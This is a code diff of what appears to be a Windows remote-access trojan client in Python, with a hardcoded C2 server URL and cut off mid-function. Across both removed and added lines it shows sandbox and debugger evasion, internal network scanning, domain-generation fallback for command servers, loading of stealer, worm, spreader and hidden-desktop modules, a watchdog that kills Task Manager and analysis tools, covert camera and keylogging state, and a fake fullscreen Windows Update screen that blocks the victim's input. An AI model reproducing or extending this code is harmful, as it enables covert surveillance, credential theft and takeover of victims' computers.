@@ -1,3928 +1,2259 @@
-import sys
-import os
-import time
-import asyncio
-import threading
-import subprocess
-import struct
-import socket
-import getpass
-import json
-import tempfile
-import ctypes
-import ssl
-import traceback
-import platform
-import urllib.request
-import string
-import datetime
-import websockets
-def _anti_analysis():
-    """Detects and evades virtual machines, debuggers, and sandboxes."""
-    import ctypes, sys, os
-    
-    # 1. Debugger Check
-    try:
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            return True
-    except: pass
-
-    # 2. Virtual Machine / Sandbox Checks
-    vm_indicators = [
-        r"SOFTWARE\VMware, Inc.\VMware Tools",
-        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
-    ]
-    import winreg
-    for key in vm_indicators:
-        try:
-            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
-            winreg.CloseKey(k)
-            return True # VM Detected
-        except:
-            pass
-
-    # 3. Process Check for common analysis tools
-    analysis_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vmsrvc.exe", "xenservice.exe", "vmwaretray.exe", "vmwareuser.exe", "wireshark.exe", "ollydbg.exe", "x64dbg.exe"]
-    try:
-        import subprocess
-        tasklist = subprocess.check_output("tasklist", creationflags=0x08000000).decode().lower()
-        for p in analysis_procs:
-            if p in tasklist:
-                return True
-    except:
-        pass
-    
-    return False
-
-# Detect but don't exit for this engineering build
-_is_vm = False # _anti_analysis()
-
-# ── NETWORK RECONNAISSANCE ENGINE (The Scout) ──────────────────────────────
-class NetScanner:
-    @staticmethod
-    async def ping_sweep(network_prefix):
-        """High-speed internal network discovery using concurrent pings."""
-        tasks = []
-        found_hosts = []
-        
-        async def _ping(ip):
-            try:
-                # Use OS-specific ping for speed
-                proc = await asyncio.create_subprocess_exec(
-                    'ping', '-n', '1', '-w', '500', ip,
-                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
-                )
-                stdout, _ = await proc.communicate()
-                if b"TTL=" in stdout:
-                    found_hosts.append(ip)
-            except: pass
-
-        for i in range(1, 255):
-            tasks.append(_ping(f"{network_prefix}.{i}"))
-        
-        await asyncio.gather(*tasks)
-        return sorted(found_hosts)
-
-    @staticmethod
-    async def port_scan(target_ip, ports=[21,22,23,80,443,445,3389,8080]):
-        """Fast asynchronous TCP port scanner."""
-        open_ports = []
-        
-        async def _check_port(port):
-            try:
-                conn = asyncio.open_connection(target_ip, port)
-                _, writer = await asyncio.wait_for(conn, timeout=1.0)
-                open_ports.append(port)
-                writer.close()
-                await writer.wait_closed()
-            except: pass
-
-        tasks = [_check_port(p) for p in ports]
-        await asyncio.gather(*tasks)
-        return sorted(open_ports)
-
-# ── CRYPTOGRAPHIC LAYER (AES-256-GCM) ──────────────────────────────────────
-_aes_key = None
-def _init_crypto(node_id):
-    global _aes_key
-    secret = b"omega_elite_master_secret_2024"
-    # Simple derivation to match server logic
-    import hashlib, hmac
-    _aes_key = hashlib.pbkdf2_hmac('sha256', secret, node_id.encode(), 100000)
-
-def _encrypt(data: str, node_id: str):
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-    import os, base64
-    aesgcm = AESGCM(_aes_key)
-    nonce = os.urandom(12)
-    ct = aesgcm.encrypt(nonce, data.encode(), None)
-    return base64.b64encode(nonce + ct).decode()
-
-def _decrypt(data_b64: str, node_id: str):
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-    import base64
-    try:
-        aesgcm = AESGCM(_aes_key)
-        raw = base64.b64decode(data_b64)
-        nonce, ct = raw[:12], raw[12:]
-        return aesgcm.decrypt(nonce, ct, None).decode()
-    except:
-        return None
+import sys, os, time, asyncio, threading, subprocess, struct
+import socket, getpass, shutil, base64, json, tempfile, re, ctypes, queue
+import ssl, traceback, platform, urllib.request
 
 # ── Elite Core Modules (Deferred Loading) ───────────────────────────────────
+cv2 = capture_engine = input_hub = VideoEncoder = WebRTCManager = websockets = None
+stealer = stealth = injection = spreader = worm = hvnc = web_injector = None
+stealer_omega = None
+recon = None
+
 def _bootstrap_modules():
-    # Apex Ultra: Ensure full DPI awareness to prevent coordinate scaling drift
-    try:
-        import ctypes
-        ctypes.windll.shcore.SetProcessDpiAwareness(1) # PROCESS_SYSTEM_DPI_AWARE
-    except:
-        try: ctypes.windll.user32.SetProcessDPIAware()
-        except: pass
-
-    # Apex Ultra: Initialize high-fidelity HID sequencer
-    st.hid_queue = asyncio.Queue()
-    asyncio.create_task(hid_processor())
-
-    try:
-        import websockets as _ws
-
-        globals()["websockets"] = _ws
-    except:
-        pass
-    # cv2 and heavy modules optional
+    global cv2, capture_engine, input_hub, VideoEncoder, WebRTCManager, websockets
+    global stealer, stealth, injection, spreader, worm, hvnc, web_injector
+    global stealer_omega, recon
+    import websockets as _ws
+    websockets = _ws
     try:
         import cv2 as _cv2
-        globals()["cv2"] = _cv2
+        globals()['cv2'] = _cv2
+    except Exception as e:
+        log(f"[BOOTSTRAP] cv2 failed: {e}")
+    try:
         from core.capture import capture_engine as _ce
-        globals()["capture_engine"] = _ce
+        capture_engine = _ce
+    except Exception as e:
+        log(f"[BOOTSTRAP] capture_engine failed: {e}")
+    try:
         from core.input import input_hub as _ih
-        globals()["input_hub"] = _ih
-        log("[BOOT] HID Module: Loaded")
+        input_hub = _ih
+    except Exception as e:
+        log(f"[BOOTSTRAP] input_hub failed: {e}")
+    try:
         from core.encoder import VideoEncoder as _ve
-        globals()["VideoEncoder"] = _ve
-        from core.webrtc_service import WebRTCManager as _rtcm
-        globals()["WebRTCManager"] = _rtcm
-        from core.filters import filter_engine as _fe
-        globals()["filter_engine"] = _fe
-        from core.camera import camera_engine as _cam
-        globals()["camera_engine"] = _cam
-        try:
-            from core.stealer import stealer as _st
-            globals()["stealer"] = _st
-            log("[BOOT] Stealer Module: Operational")
-        except: pass
-    except Exception as _e:
-        log(f"[BOOT] Core Modules Error: {_e}")
-        import traceback
-        log(traceback.format_exc())
+        VideoEncoder = _ve
+    except Exception as e:
+        log(f"[BOOTSTRAP] VideoEncoder failed: {e}")
     try:
-        pass
-    except:
-        pass
+        from core.webrtc_service import WebRTCManager as _wm
+        WebRTCManager = _wm
+    except Exception as e:
+        log(f"[BOOTSTRAP] WebRTCManager failed: {e}")
     try:
-        from turbojpeg import TurboJPEG, TJPF_RGB, TJSAMP_420
-
-        globals()["tj"] = TurboJPEG()
-        globals()["TJPF_RGB"] = TJPF_RGB
-        globals()["TJSAMP_420"] = TJSAMP_420
-    except:
-        globals()["tj"] = None
-        globals()["TJPF_RGB"] = 0
-        globals()["TJSAMP_420"] = 2
+        from modules import stealer as _s, stealth as _st, injection as _inj
+        from modules import spreader as _sp, worm as _w, hvnc as _hv, web_injector as _wi
+        stealer = _s; stealth = _st; injection = _inj
+        spreader = _sp; worm = _w; hvnc = _hv; web_injector = _wi
+    except Exception as e:
+        log(f"[BOOTSTRAP] legacy modules failed: {e}")
     try:
-        from modules.extended_commands import register_extended
+        from modules import stealer_omega as _so
+        stealer_omega = _so
+        log("[BOOTSTRAP] stealer_omega loaded")
+    except Exception as e:
+        log(f"[BOOTSTRAP] stealer_omega failed: {e}")
+    try:
+        from modules import recon as _recon
+        recon = _recon
+        log("[BOOTSTRAP] recon loaded")
+    except Exception as e:
+        log(f"[BOOTSTRAP] recon failed: {e}")
 
-        register_extended(COMMANDS)
-    except Exception as _e:
-        print(f"[EXT] extended_commands load error: {_e}")
-
-
-cv2 = capture_engine = input_hub = VideoEncoder = WebRTCManager = filter_engine = (
-    camera_engine
-) = None
-stealer = stealth = injection = spreader = worm = hvnc = web_injector = None
-
-# websockets is required — ensure it's always loaded
-try:
-    import websockets
-except:
-    websockets = None
-
-
-async def hid_processor():
-    """Sequential HID Executor to prevent race conditions in remote interaction."""
-    while True:
-        try:
-            if not hasattr(st, "hid_queue"):
-                await asyncio.sleep(0.1)
-                continue
-            op, args = await st.hid_queue.get()
-            # Execute in thread to avoid blocking the event loop
-            try:
-                await global_loop.run_in_executor(None, op, *args)
-            except Exception as e:
-                log(f"[HID] EXECUTION ERROR in {op.__name__}: {e}")
-                log(traceback.format_exc())
-            st.hid_queue.task_done()
-        except Exception as e:
-            log(f"[HID] PROCESSOR ERROR: {e}")
-            await asyncio.sleep(0.01)
-
-# ── CRASH LOGGER ──
+# ─────────────────────────────────────────────────────────────────────────────
+# CRASH LOGGER
+# ─────────────────────────────────────────────────────────────────────────────
 def _log_crash(exc_type, exc_value, tb):
     try:
         path = os.path.join(os.environ.get("TEMP", ""), "mrl_debug.txt")
         with open(path, "a", encoding="utf-8") as f:
             f.write("\n=== CRASH ===\n")
             traceback.print_exception(exc_type, exc_value, tb, file=f)
-    except:
-        pass
-
+    except: pass
 
 sys.excepthook = _log_crash
 
+# ─────────────────────────────────────────────────────────────────────────────
+# HELPERS
+# ─────────────────────────────────────────────────────────────────────────────
+def _b64d(s):
+    try: return base64.b64decode(s).decode("utf-8", errors="ignore")
+    except: return s
 
-# ── HELPERS ──
 def log(msg):
     ts = time.strftime("%H:%M:%S")
     try:
-        # Use safe encoding for console printing
-        safe_msg = str(msg).encode("ascii", "replace").decode()
-        print(f"[{ts}] {safe_msg}", flush=True)
-    except:
-        pass
+        print(f"[{ts}] {msg}", flush=True)
+    except: pass
     try:
         path = os.path.join(os.environ.get("TEMP", ""), "mrl_debug.txt")
         with open(path, "a", encoding="utf-8") as f:
             f.write(f"[{ts}] {msg}\n")
-    except:
-        pass
-
+    except: pass
 
 def jdumps(obj):
     try:
         import orjson
-
         return orjson.dumps(obj).decode()
     except:
         return json.dumps(obj)
 
-
 def jloads(data):
     try:
         import orjson
-
         return orjson.loads(data)
     except:
         return json.loads(data)
 
+# ─────────────────────────────────────────────────────────────────────────────
+# CONFIG
+# ─────────────────────────────────────────────────────────────────────────────
+BUILD      = "v21.5-OMEGA-PRO"
+SERVER_URL = "https://web-production-1f6c6.up.railway.app"
 
-# ── CONFIG ──
-BUILD = "v21.4-MRL-WARE"
-SERVER_URL = "https://web-production-43c07.up.railway.app"
-RANSOM_WALLPAPER_URL = (
-    "https://www.malwaretech.com/wp-content/uploads/2017/06/petya.png"
-)
+RANSOM_WALLPAPER_URL = "https://www.malwaretech.com/wp-content/uploads/2017/06/petya.png"
 global_loop = None
-_rtc = None
-_uid = None
 
-
-def _generate_dga_domains(seed_date=None, count=100):
-    """Generates a list of predictable fallback domains based on a date seed."""
-    if seed_date is None:
-        seed_date = datetime.datetime.now()
-    
-    domains = []
-    tlds = [".com", ".net", ".org", ".xyz", ".info"]
-    
-    # Use date as seed for reproducibility across the entire fleet
-    seed = int(seed_date.strftime("%Y%m%d"))
-    import random
-    rng = random.Random(seed)
-    
-    for _ in range(count):
-        length = rng.randint(8, 15)
-        name = "".join(rng.choice(string.ascii_lowercase) for _ in range(length))
-        tld = rng.choice(tlds)
-        domains.append(f"{name}{tld}")
-    return domains
-
-def _ws_url(dga_retry_idx=None):
+def _ws_url():
     url = SERVER_URL
-    
-    # If we are in DGA fallback mode
-    if dga_retry_idx is not None:
-        fallback_domains = _generate_dga_domains()
-        if dga_retry_idx < len(fallback_domains):
-            url = f"https://{fallback_domains[dga_retry_idx]}"
-            log(f"[DGA] Phoenix Fallback engaged: {url}")
-        else:
-            return None # Exhausted today's domains
-
     try:
-        env_url = os.environ.get("OMEGA_URL")
-        if env_url:
-            url = env_url
-        elif dga_retry_idx is None:
-            candidates = [
-                os.path.join(os.path.dirname(sys.executable), "c2.url"),
-                os.path.join(os.getcwd(), "c2.url"),
-                os.path.join(os.environ.get("LOCALAPPDATA", ""), "MRL", "c2.url"),
-            ]
-            for conf in candidates:
-                if os.path.exists(conf):
-                    with open(conf, "r") as f:
-                        line = f.read().strip()
-                        if line:
-                            url = line
-                            break
-    except:
-        pass
+        candidates = [
+            os.path.join(os.path.dirname(sys.executable), "c2.url"),
+            os.path.join(os.getcwd(), "c2.url"),
+            os.path.join(os.environ.get("LOCALAPPDATA", ""), "MRL", "c2.url"),
+            "c2.url"
+        ]
+        for conf in candidates:
+            if os.path.exists(conf):
+                with open(conf, "r") as f:
+                    url = f.read().strip()
+                if url: break
+    except: pass
 
-    if not url or "localhost" in url:
-        # If no URL or local fallback, try to favor the production website URL first
-        url = SERVER_URL if SERVER_URL else "http://localhost:8000"
+    if not url: url = "http://localhost:8000"
 
-    # Handle protocol and path
-    base = url.replace("https://", "").replace("http://", "").strip("/")
-    
-    # If the URL is explicitly https or contains railway, use wss
-    if "https://" in url or "railway" in url:
-        proto = "wss"
-    elif ":" in base and ("localhost" in base or "127.0.0.1" in base):
-        # Local development usually uses ws
-        proto = "ws"
-    else:
-        # Default to wss for production domains, fallback to ws for raw IPs
-        proto = "wss" if "." in base and not base.replace(".", "").isdigit() else "ws"
+    base = url.replace("https://", "").replace("http://", "")
+    proto = "wss" if ("https" in url or "railway" in url) else "ws"
+    if "/" in base:
+        return f"{proto}://{base}"
+    return f"{proto}://{base}/ws"
 
-    final_uri = f"{proto}://{base}/ws"
-    return final_uri
+# ─────────────────────────────────────────────────────────────────────────────
+# STATE
+# ─────────────────────────────────────────────────────────────────────────────
+class St:
+    streaming      = False
+    quality        = 70
+    monitor_idx    = 0
+    mnk_active     = False
+    cursor_locked  = False
+    keylog_active  = False
+    keylog_data    = []
+    jumpscare_on   = False
+    audio_stream   = False
+    grid_mode      = False   # multi-monitor grid streaming
+    # Camera
+    camera_active  = False
+    camera_idx     = 0       # which camera to use
+    camera_no_led  = True    # burst-capture mode to avoid LED
+    camera_list    = []      # enumerated camera names
+    # Volume
+    volume         = 50
+    # Chaos mouse
+    mouse_chaos    = False
+    # Clipboard
+    clipboard_monitor = False
+    # Geo
+    geo_info       = {}
+    # Screenshot scheduler
+    sched_ss       = False
+    sched_interval = 10
+    # Fake Update overlay
+    fake_update_active   = False
+    fake_update_procs    = []   # list of subprocess.Popen handles
+    # Hidden operator desktop (HVNC-light)
+    hidden_desktop_hnd   = None  # Win32 HDESK handle
+    hidden_desktop_proc  = None  # process running on hidden desktop
+    hidden_stream_active = False
+    # Camera frame cache
+    last_cam_frame = None
 
+st = St()
+_fq = queue.Queue(maxsize=1)
+_pq = queue.Queue(maxsize=1)
 
-# ── STATE ──
-from core.state import st
-
-# ── SINGLE INSTANCE MUTEX (disabled for reliability) ──
-# Note: Mutex removed to prevent ghost-instance blocking issues with standalone EXE
-
-
-# ── WATCHDOG ──
+# ── System Shadow Watchdog ──────────────────────────────────────────────────
 def _watchdog_loop():
-    forbidden = [
-        "processhacker.exe",
-        "wireshark.exe",
-        "procexp.exe",
-    ]  # Removed taskmgr.exe per user request
+    """Elite Stealth: Automatically closes Task Manager/Process Hacker."""
+    forbidden = ["taskmgr.exe", "processhacker.exe", "wireshark.exe",
+                 "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe"]
     while True:
         try:
             import psutil
-
-            for proc in psutil.process_iter(["name"]):
-                if proc.info["name"].lower() in forbidden:
-                    proc.terminate()
-        except:
-            pass
-        time.sleep(1)
-
+            for proc in psutil.process_iter(['name', 'pid']):
+                try:
+                    if proc.info['name'] and proc.info['name'].lower() in forbidden:
+                        proc.kill()
+                        log(f"[WATCHDOG] Terminated: {proc.info['name']} (PID {proc.info['pid']})")
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+        except Exception as e:
+            log(f"[WATCHDOG] Loop error: {e}")
+        time.sleep(1.5)
 
 threading.Thread(target=_watchdog_loop, daemon=True).start()
+log("[STEALTH] System Shadow Watchdog Active")
 
-
-# ── SYSTEM INFO ──
+# ─────────────────────────────────────────────────────────────────────────────
+# SYSTEM INFO
+# ─────────────────────────────────────────────────────────────────────────────
 def get_hwid():
     try:
-        raw = subprocess.check_output(
-            'powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystemProduct).UUID"',
-            shell=True,
-        )
-        return raw.decode().strip()
-    except:
-        return socket.gethostname()
-
-
-def _get_monitors():
-    mons = []
-    try:
-        import mss
-
-        with mss.mss() as sct:
-            for m in sct.monitors[1:]:  # skip 0 (all screens)
-                mons.append(
-                    (
-                        m["left"],
-                        m["top"],
-                        m["left"] + m["width"],
-                        m["top"] + m["height"],
-                    )
-                )
-            if mons:
-                return mons
-    except:
-        pass
-    try:
-        import ctypes
-        import ctypes.wintypes
-
-        cb = ctypes.WINFUNCTYPE(
-            ctypes.c_int,
-            ctypes.c_ulong,
-            ctypes.c_ulong,
-            ctypes.POINTER(ctypes.wintypes.RECT),
-            ctypes.c_double,
-        )(
-            lambda h, dc, r, d: (
-                mons.append(
-                    (
-                        r.contents.left,
-                        r.contents.top,
-                        r.contents.right,
-                        r.contents.bottom,
-                    )
-                )
-                or 1
-            )
-        )
-        ctypes.windll.user32.EnumDisplayMonitors(0, 0, cb, 0)
-    except:
-        pass
-    return mons if mons else [None]
-
+        raw = subprocess.check_output("wmic csproduct get uuid", shell=True)
+        return raw.decode().split("\n")[1].strip()
+    except: return socket.gethostname()
 
 def get_specs():
-    specs = {
-        "hostname": socket.gethostname(),
-        "os": f"{platform.system()} {platform.release()}",
-        "cpu": "Unknown",
-        "gpu": "Unknown",
-        "ram": "Unknown",
-        "ipv4": "Unknown",
-        "ipv6": "—",
-        "local_ip": "Unknown",
-        "region": "Unknown",
-        "flag": "",
-        "monitors": 1,
-        "cameras": 0,
-        "disks": "C:\\",
-        "user": getpass.getuser(),
-    }
-
-    # CPU & RAM — psutil is preferred
     try:
         import psutil
-
-        specs["cpu"] = (
-            f"{platform.processor()} ({psutil.cpu_count(logical=True)} cores)"
-        )
-        specs["ram"] = f"{round(psutil.virtual_memory().total / (1024**3), 1)} GB"
-        du = psutil.disk_usage("C:\\")
-        specs["disks"] = (
-            f"{round(du.free / (1024**3), 1)}GB free of {round(du.total / (1024**3), 1)}GB"
-        )
-    except:
-        pass
-
-    # Fallback for CPU/RAM via PowerShell
-    if specs["cpu"] == "Unknown":
+        du   = psutil.disk_usage("C:")
+        free = round(du.free  / (1024**3), 1)
+        tot  = round(du.total / (1024**3), 1)
+        drives = []
         try:
-            raw = subprocess.check_output(
-                'powershell -NoProfile -Command "(Get-CimInstance Win32_Processor).Name"',
-                shell=True,
-                timeout=5,
-            ).decode(errors="ignore")
-            specs["cpu"] = raw.strip().split("\n")[0]
-        except:
-            pass
-
-    if specs["ram"] == "Unknown":
-        try:
-            raw = subprocess.check_output(
-                'powershell -NoProfile -Command "Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object -ExpandProperty Sum"',
-                shell=True,
-                timeout=5,
-            ).decode(errors="ignore")
-            specs["ram"] = f"{round(int(raw.strip()) / (1024**3), 1)} GB"
-        except:
-            pass
-
-    if specs["gpu"] == "Unknown":
-        try:
-            raw = subprocess.check_output(
-                'powershell -NoProfile -Command "(Get-CimInstance Win32_VideoController).Name"',
-                shell=True,
-                timeout=5,
-            ).decode(errors="ignore")
-            gpus = [g.strip() for g in raw.strip().split("\n") if g.strip()]
-            if gpus:
-                specs["gpu"] = " + ".join(gpus)
-        except:
-            pass
-
-    # Monitors
-    try:
+            for p in psutil.disk_partitions(all=False):
+                if p.fstype: drives.append(p.device)
+        except: drives = ["C:\\"]
         mons = _get_monitors()
-        specs["monitors"] = max(1, len([m for m in mons if m is not None]))
+        monitor_names = [f"Monitor {i+1} ({m[2]-m[0]}x{m[3]-m[1]})" for i, m in enumerate(mons) if m]
+        return {
+            "hostname": socket.gethostname(),
+            "os":       f"{platform.system()} {platform.release()}",
+            "cpu":      f"{psutil.cpu_count()} Cores",
+            "ram":      f"{round(psutil.virtual_memory().total/(1024**3),2)} GB",
+            "gpu":      "Integrated",
+            "disk":     f"{free} GB / {tot} GB",
+            "disk_total": tot, "disk_free": free,
+            "ip":       "127.0.0.1",
+            "user":     getpass.getuser(),
+            "drives":   drives,
+            "monitors": monitor_names,
+        }
     except:
-        specs["monitors"] = 1
+        return {"hostname": socket.gethostname(), "os": "Windows",
+                "user": "User", "drives": ["C:\\"], "monitors": ["Monitor 1"]}
 
-    # Cameras — use cv2-enumerate-cameras for real device names
-    try:
-        from core.camera import get_camera_list, camera_engine  # noqa
-
-        cam_list = get_camera_list()
-        # If enumeration thread hasn't finished yet (< 2s startup), wait briefly
-        if not cam_list:
-            import time as _t
-
-            _t.sleep(1.5)
-            cam_list = get_camera_list()
-        specs["cameras"] = len(cam_list)
-        specs["camera_names"] = [c["name"] for c in cam_list]
-    except Exception as _ce:
-        specs["cameras"] = 0
-        specs["camera_names"] = []
-
-    # Local IP Detection
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        specs["local_ip"] = s.getsockname()[0]
-        s.close()
-    except:
-        try:
-            specs["local_ip"] = socket.gethostbyname(socket.gethostname())
-        except:
-            pass
-
-    # Public IP / GEO
-    ip_services = [
-        "https://api.ipify.org?format=json",
-        "https://ifconfig.co/json",
-        "https://ipapi.co/json/",
-    ]
-    for service in ip_services:
-        try:
-            req = urllib.request.Request(service, headers={"User-Agent": "Mozilla/5.0"})
-            with urllib.request.urlopen(req, timeout=5) as r:
-                data = json.loads(r.read().decode())
-                # Handle different API response formats
-                ip = data.get("ip") or data.get("query")
-                if ip:
-                    specs["ipv4"] = ip
-                    specs["region"] = (
-                        data.get("country_name")
-                        or data.get("country")
-                        or specs["region"]
-                    )
-                    cc = data.get("country_code") or data.get("countryCode")
-                    if cc:
-                        specs["flag"] = chr(ord(cc[0]) + 127397) + chr(
-                            ord(cc[1]) + 127397
-                        )
-                    break
-        except:
-            continue
-
-    # Fallback to plain IP fetch if JSON fails
-    if specs["ipv4"] == "Unknown":
-        for service in [
-            "https://api.ipify.org",
-            "https://ifconfig.me/ip",
-            "https://icanhazip.com",
-        ]:
-            try:
-                req = urllib.request.Request(
-                    service, headers={"User-Agent": "curl/7.68.0"}
-                )
-                with urllib.request.urlopen(req, timeout=5) as r:
-                    specs["ipv4"] = r.read().decode().strip()
-                    if specs["ipv4"]:
-                        break
-            except:
-                continue
-
-    return specs
-
-
-# ── WEBSOCKET HELPERS ──
+# ─────────────────────────────────────────────────────────────────────────────
+# WEBSOCKET HELPERS
+# ─────────────────────────────────────────────────────────────────────────────
 async def send(ws, obj):
+    try: await ws.send(jdumps(obj))
+    except: pass
+
+async def send_bin(ws, tag: int, data: bytes):
+    try: await ws.send(struct.pack("B", tag) + data)
+    except: pass
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MONITOR ENUMERATION
+# ─────────────────────────────────────────────────────────────────────────────
+def _get_monitors():
     try:
-        payload = jdumps(obj)
-        if _aes_key:
-            payload = _encrypt(payload, "")
-        await ws.send(payload)
-    except:
-        pass
+        import ctypes, ctypes.wintypes
+        monitors = []
+        cb = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong,
+                                ctypes.POINTER(ctypes.wintypes.RECT), ctypes.c_double)(
+            lambda h, dc, r, d: monitors.append(
+                (r.contents.left, r.contents.top, r.contents.right, r.contents.bottom)) or 1)
+        ctypes.windll.user32.EnumDisplayMonitors(0, 0, cb, 0)
+        return monitors if monitors else [None]
+    except: return [None]
 
 
-async def send_bin(ws, tag, data):
+# ─────────────────────────────────────────────────────────────────────────────
+# FAKE UPDATE ENGINE
+# ─────────────────────────────────────────────────────────────────────────────
+_WIN11_UPDATE_HTML = r"""<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Windows Update</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    background:#0078d4;
+    font-family:'Segoe UI',system-ui,sans-serif;
+    color:#fff;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    height:100vh;
+    overflow:hidden;
+    user-select:none;
+    cursor:none;
+  }
+  .logo{
+    width:72px;height:72px;
+    display:grid;grid-template-columns:1fr 1fr;gap:4px;
+    margin-bottom:48px;
+  }
+  .logo div{background:#fff;border-radius:2px}
+  .ring-wrap{position:relative;width:120px;height:120px;margin-bottom:40px}
+  .ring{
+    width:120px;height:120px;
+    border:6px solid rgba(255,255,255,0.4);
+    border-top-color:#fff;
+    border-radius:50%;
+    animation:spin 1.1s linear infinite;
+  }
+  .pct{
+    position:absolute;top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    font-size:22px;font-weight:600;letter-spacing:0.5px;
+  }
+  h1{font-size:28px;font-weight:300;margin-bottom:14px;letter-spacing:-0.5px}
+  p{font-size:15px;opacity:0.9;margin-bottom:48px}
+  .dots span{
+    display:inline-block;width:10px;height:10px;
+    background:#fff;border-radius:50%;margin:0 5px;
+    animation:bounce 1.4s infinite ease-in-out both;
+  }
+  .dots span:nth-child(1){animation-delay:-0.32s}
+  .dots span:nth-child(2){animation-delay:-0.16s}
+  .warn{
+    position:fixed;bottom:24px;left:0;right:0;
+    text-align:center;font-size:13px;opacity:0.75;
+    font-weight:300;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes bounce{
+    0%,80%,100%{transform:scale(0)}
+    40%{transform:scale(1)}
+  }
+</style>
+</head>
+<body>
+<div class="logo">
+  <div></div><div></div><div></div><div></div>
+</div>
+<div class="ring-wrap">
+  <div class="ring"></div>
+  <div class="pct" id="pct">0%</div>
+</div>
+<h1>Working on updates</h1>
+<p>This might take a while. Your PC will restart <strong>several times</strong>.</p>
+<p>Don't turn off your PC.</p>
+<div class="dots"><span></span><span></span><span></span></div>
+<div class="warn">⊞ &nbsp; Keep your PC on.</div>
+<script>
+  var p=0,spd=null;
+  function tick(){
+    if(p<30)spd=1;
+    else if(p<60)spd=0.4;
+    else if(p<88)spd=0.15;
+    else spd=0.04;
+    p=Math.min(p+spd,100);
+    document.getElementById('pct').textContent=Math.floor(p)+'%';
+    if(p<100)setTimeout(tick,80);
+  }
+  tick();
+  // Block all keyboard/mouse
+  document.addEventListener('keydown',function(e){e.preventDefault();e.stopPropagation();},true);
+  document.addEventListener('contextmenu',function(e){e.preventDefault();},true);
+</script>
+</body>
+</html>"""
+
+def _launch_fake_update():
+    """Show Windows Update overlay. Primary=update page. Others=black. Operator stream unaffected."""
+    procs = []
+
+    # Write the update HTML to temp
+    tmp_html = os.path.join(os.environ.get("TEMP", ""), "_omega_update.html")
     try:
-        await ws.send(struct.pack("B", tag) + data)
-    except:
-        pass
+        with open(tmp_html, "w", encoding="utf-8") as f:
+            f.write(_WIN11_UPDATE_HTML)
+    except Exception as e:
+        log(f"[FAKE_UPDATE] HTML write: {e}")
+        return procs
+
+    monitors = _get_monitors()
+    primary  = monitors[0] if monitors else None
+
+    # ── Primary monitor: mshta fullscreen blue update page ──
+    try:
+        p = subprocess.Popen(
+            ["powershell", "-WindowStyle", "Maximized", "-Command",
+             f"Start-Process mshta.exe -ArgumentList '{tmp_html}' -WindowStyle Maximized"],
+            creationflags=subprocess.CREATE_NO_WINDOW)
+        procs.append(("mshta_update", p))
+        # Give it a moment then force true fullscreen via Win32
+        time.sleep(0.8)
+        _force_mshta_fullscreen()
+    except Exception as e:
+        log(f"[FAKE_UPDATE] mshta launch: {e}")
+
+    # ── Secondary monitors: black topmost click-through windows ──
+    def _black_monitor(rect):
+        """Run a topmost click-through black Tk window on one monitor."""
+        try:
+            import tkinter as tk
+            root = tk.Tk()
+            root.configure(bg="#000000")
+            root.geometry(f"{rect[2]-rect[0]}x{rect[3]-rect[1]}+{rect[0]}+{rect[1]}")
+            root.overrideredirect(True)
+            root.attributes("-topmost", True)
+            # Make transparent to input (click-through) so operator's remote mouse still works
+            hwnd = int(root.frame(), 16)
+            ex_style = ctypes.windll.user32.GetWindowLongW(hwnd, -20)
+            ctypes.windll.user32.SetWindowLongW(
+                hwnd, -20, ex_style | 0x80000 | 0x20)  # WS_EX_LAYERED | WS_EX_TRANSPARENT
+            ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, 255, 0x2)
+            root.mainloop()
+        except Exception as e:
+            log(f"[BLACK_MON] {e}")
+
+    for i, mon in enumerate(monitors[1:], 1):
+        t = threading.Thread(target=_black_monitor, args=(mon,), daemon=True)
+        t.start()
+        procs.append(("black_thread", t))
+
+    return procs
 
 
-# ── ADAPTIVE QUALITY ENGINE (AnyDesk-style) ─────────────────────────────────
-class AdaptiveQuality:
+def _force_mshta_fullscreen():
+    """Find the mshta window and force it to be truly fullscreen + topmost + click-through-safe."""
+    try:
+        import ctypes
+        SW_MAXIMIZE = 3
+        WS_EX_TOPMOST = 0x00000008
+
+        def enum_callback(hwnd, _):
+            title = ctypes.create_unicode_buffer(256)
+            ctypes.windll.user32.GetWindowTextW(hwnd, title, 256)
+            cls   = ctypes.create_unicode_buffer(256)
+            ctypes.windll.user32.GetClassNameW(hwnd, cls, 256)
+            if "Internet Explorer_Server" in cls.value or \
+               "Windows Update" in title.value or \
+               "MSHTML" in cls.value:
+                # Maximize + set topmost + borderless
+                ctypes.windll.user32.ShowWindow(hwnd, SW_MAXIMIZE)
+                ctypes.windll.user32.SetWindowPos(
+                    hwnd, -1, 0, 0, 0, 0,
+                    0x0001 | 0x0002 | 0x0040)  # SWP_NOMOVE|SWP_NOSIZE|SWP_SHOWWINDOW
+            return True
+
+        EnumProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_void_p)
+        ctypes.windll.user32.EnumWindows(EnumProc(enum_callback), 0)
+    except: pass
+
+
+def _revert_fake_update():
+    """Kill all fake update overlay processes and restore the display."""
+    # Kill any mshta processes we spawned
+    try:
+        subprocess.run("taskkill /f /im mshta.exe",
+                       shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+    except: pass
+
+    # Kill all Tk black overlay threads (can't easily kill threads, but the windows will die
+    # when the process/thread ends — force kill via Win32 FindWindow)
+    try:
+        import ctypes
+
